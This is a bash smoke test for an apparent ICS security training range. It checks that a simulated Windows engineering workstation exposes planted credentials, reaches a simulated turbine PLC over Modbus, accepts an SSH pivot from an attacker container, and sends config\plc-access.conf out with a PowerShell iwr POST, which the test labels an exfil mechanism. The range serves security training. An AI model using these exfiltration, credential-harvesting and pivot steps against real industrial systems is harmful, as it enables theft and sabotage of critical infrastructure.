#!/usr/bin/env bash
# uupl-eng-ws Windows 10 LTSC facade smoke test
#
# Coverage:
#   Identity: whoami, hostname, ipconfig (dual-homed ops+control), route print,
#             netstat (live PLC and historian connections)
#   Credentials: plc-access.conf (full OT device inventory with credentials),
#                engineering_notes.txt (consolidated credential sheet),
#                Projects/Firmware/README.txt (turbineadmin),
#                Desktop/update_plc_firmware.ps1 (same)
#   Backup: dir backups\ lists PLC_Backup_2019.tar.gz
#   PLC tools: modbus_read.py reaches live PLC (input registers, holding registers)
#   PSReadLine: history shows historian queries and Modbus commands
#   Poll log: plc_poll.log has cron-driven ingest entries
#   iwr -InFile: facade correctly POSTs a file body (exfil mechanism)
#   SSH auth (password): engineer/spanner99 via wizzards-retreat jump
#   SSH auth (key): wizzards-retreat key accepted for engineer account
#   Credential chain: plc admin credentials from engineering_notes.txt reach PLC
#
# Usage: bash tests/smoke/test_uupl_eng_ws_facade.sh
set -uo pipefail

REPO="$(cd "$(dirname "$0")/../.." && pwd)"
source "$REPO/tests/smoke/lib.sh"

ENGWS="uupl-eng-ws"
JUMP="wizzards-retreat"
ATTACKER="unseen-gate"
HIST="uupl-historian"
PLC="hex-turbine-plc"

require_running "$ENGWS"
require_running "$JUMP"
require_running "$ATTACKER"
require_running "$HIST"
require_running "$PLC"

ws() { in_container "$ENGWS" /usr/local/bin/win10ltsc_shell.sh -c "$1"; }

ENG_IP=$(container_ip "$ENGWS" operational)
HIST_IP=$(container_ip "$HIST" operational)
PLC_IP=$(container_ip "$PLC" control)

echo "[uupl-eng-ws] Waiting for SSH on $ENG_IP..."
if ! wait_for_port "$JUMP" "$ENG_IP" 22 30; then
    fail "uupl-eng-ws :22 not ready within 30s"
    summary; exit 1
fi

# ── Identity ──────────────────────────────────────────────────────────────────

echo "[uupl-eng-ws] Identity"

WHOAMI_OUT="$(ws "whoami")"
assert_contains "$WHOAMI_OUT" "engineer" "whoami contains engineer"

HOST_OUT="$(ws "hostname")"
assert_contains "$HOST_OUT" "ENG-WS01" "hostname returns ENG-WS01"

IPCFG_OUT="$(ws "ipconfig")"
assert_contains "$IPCFG_OUT" "${ENG_IP//./\\.}" \
    "ipconfig shows operational IP ($ENG_IP)"
assert_contains "$IPCFG_OUT" "10\.10\.3\.100" \
    "ipconfig shows control-zone IP 10.10.3.100 (dual-homed)"

ROUTE_OUT="$(ws "route print")"
assert_contains "$ROUTE_OUT" "10\.10\.3\.0" \
    "route print shows control-zone subnet 10.10.3.0 directly attached"

NETSTAT_OUT="$(ws "netstat -ano")"
assert_contains "$NETSTAT_OUT" "Active Connections" "netstat shows Active Connections header"

# ── Credential discovery ──────────────────────────────────────────────────────

echo "[uupl-eng-ws] Credential discovery"

PLCCONF_OUT="$(ws 'cat config\plc-access.conf')"
assert_contains "$PLCCONF_OUT" "hex_turbine_controller|10\.10\.3\.21" \
    "plc-access.conf lists turbine PLC"
assert_contains "$PLCCONF_OUT" "relay1234|admin" \
    "plc-access.conf lists relay web credentials"

NOTES_OUT="$(ws 'cat Documents\engineering_notes.txt')"
assert_contains "$NOTES_OUT" "Historian2015"  "engineering_notes.txt contains Historian2015"
assert_contains "$NOTES_OUT" "W1nd0ws@2016"   "engineering_notes.txt contains SCADA SSH password"
assert_contains "$NOTES_OUT" "admin.*admin|admin/admin" \
    "engineering_notes.txt contains SCADA web credentials"

FW_README="$(ws 'cat Projects\Firmware\README.txt')"
assert_contains "$FW_README" "turbineadmin" "Projects/Firmware/README.txt contains turbineadmin"
assert_contains "$FW_README" "10\.10\.3\.21" "Projects/Firmware/README.txt contains PLC IP"

FW_SCRIPT="$(ws 'cat Desktop\update_plc_firmware.ps1')"
assert_contains "$FW_SCRIPT" "turbineadmin" "update_plc_firmware.ps1 contains turbineadmin"

# ── Backup archive ────────────────────────────────────────────────────────────

echo "[uupl-eng-ws] Backup archive"

BACKUP_OUT="$(ws 'dir backups\')"
assert_contains "$BACKUP_OUT" "PLC_Backup_2019" "dir backups\ lists PLC_Backup_2019.tar.gz"

# ── PLC tools: live readings ──────────────────────────────────────────────────

echo "[uupl-eng-ws] PLC tools"

MODBUS_IN="$(ws "python Tools\\modbus_read.py $PLC_IP 502 input 0 5")"
assert_contains "$MODBUS_IN" "[0-9]" \
    "modbus_read.py reads turbine input registers (RPM, temperature, pressure)"

MODBUS_HR="$(ws "python Tools\\modbus_read.py $PLC_IP 502 holding 0 4")"
assert_contains "$MODBUS_HR" "[0-9]" \
    "modbus_read.py reads turbine holding registers (governor setpoint, valve)"

# ── PSReadLine history ─────────────────────────────────────────────────────────

echo "[uupl-eng-ws] PSReadLine history"

HIST_TXT="$(ws 'cat AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt')"
assert_contains "$HIST_TXT" "modbus_read|10\.10\.3\.21|502" \
    "PSReadLine history shows Modbus commands against PLC"
assert_contains "$HIST_TXT" "10\.10\.2\.10|historian|8080|curl" \
    "PSReadLine history shows historian API queries"

# ── Poll log ───────────────────────────────────────────────────────────────────

echo "[uupl-eng-ws] Poll log"

POLL_OUT="$(ws 'cat plc_poll.log')"
assert_contains "$POLL_OUT" "rpm=|poll_and_ingest|ingested|ok" \
    "plc_poll.log has cron-driven ingest entries"

# ── iwr -InFile: facade POST file body ────────────────────────────────────────

echo "[uupl-eng-ws] iwr -InFile"

# Start a minimal receiver on wizzards-retreat, send a file, confirm receipt.
docker exec "$JUMP" bash -c '
rm -f /tmp/_engws_iwr_test
python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
class R(BaseHTTPRequestHandler):
    def do_POST(self):
        n = int(self.headers.get(\"Content-Length\", 0))
        open(\"/tmp/_engws_iwr_test\", \"wb\").write(self.rfile.read(n))
        self.send_response(200); self.end_headers()
    def log_message(self, *a): pass
HTTPServer((\"10.10.2.3\", 19999), R).serve_forever()
" &>/dev/null &
' 2>/dev/null
# Wait until the port is actually listening before sending the request.
for _i in $(seq 1 10); do
    docker exec "$JUMP" ss -tlnp 2>/dev/null | grep -q 19999 && break
    sleep 1
done

IWR_OUT="$(ws "iwr -Method POST -Uri http://10.10.2.3:19999/test -InFile config\\plc-access.conf")"
assert_contains "$IWR_OUT" "200|StatusCode" "iwr -Method POST -InFile sends file and gets 200"

# Brief pause for the server to finish writing before we read the size.
sleep 1
RECV_BYTES=$(docker exec "$JUMP" bash -c \
    'wc -c < /tmp/_engws_iwr_test 2>/dev/null || echo 0')
docker exec "$JUMP" bash -c \
    'pkill -f "_engws_iwr_test\|19999" 2>/dev/null; rm -f /tmp/_engws_iwr_test' 2>/dev/null || true

if [ "$RECV_BYTES" -gt 0 ]; then
    ok "iwr -InFile sent file body ($RECV_BYTES bytes received on wizzards-retreat)"
else
    fail "iwr -InFile sent empty body (receiver got 0 bytes)"
fi

# ── SSH auth (password) via jump ──────────────────────────────────────────────

echo "[uupl-eng-ws] SSH authentication (password)"

SSH_OUT="$(ssh_password_login_via_jump "$ATTACKER" \
    rincewind 10.10.0.10 wizzard \
    engineer "$ENG_IP" spanner99)"
assert_contains "$SSH_OUT" "SSH_OK" \
    "engineer/spanner99 authenticates via wizzards-retreat jump"

SSH_CMD="$(ssh_password_login_via_jump "$ATTACKER" \
    rincewind 10.10.0.10 wizzard \
    engineer "$ENG_IP" spanner99 \
    "hostname")"
assert_contains "$SSH_CMD" "ENG-WS01" \
    "SSH exec via jump: hostname returns ENG-WS01 through facade"

# ── SSH auth (key) from wizzards-retreat ──────────────────────────────────────

echo "[uupl-eng-ws] SSH authentication (key)"

KEY_OUT="$(docker exec "$JUMP" ssh \
    -i /home/rincewind/.ssh-keys/uupl_eng_key \
    -o StrictHostKeyChecking=no \
    -o BatchMode=yes \
    -o ConnectTimeout=10 \
    "engineer@${ENG_IP}" hostname 2>&1)"
assert_contains "$KEY_OUT" "ENG-WS01" \
    "wizzards-retreat uupl_eng_key authenticates against engineer account (keyless)"

# ── Credential chain ──────────────────────────────────────────────────────────

echo "[uupl-eng-ws] Credential chain"

MODBUS_CHAIN="$(ws "python Tools\\modbus_read.py $PLC_IP 502 input 0 1")"
assert_contains "$MODBUS_CHAIN" "[0-9]" \
    "turbineadmin path (from engineering_notes.txt): Modbus read reaches live PLC"

summary
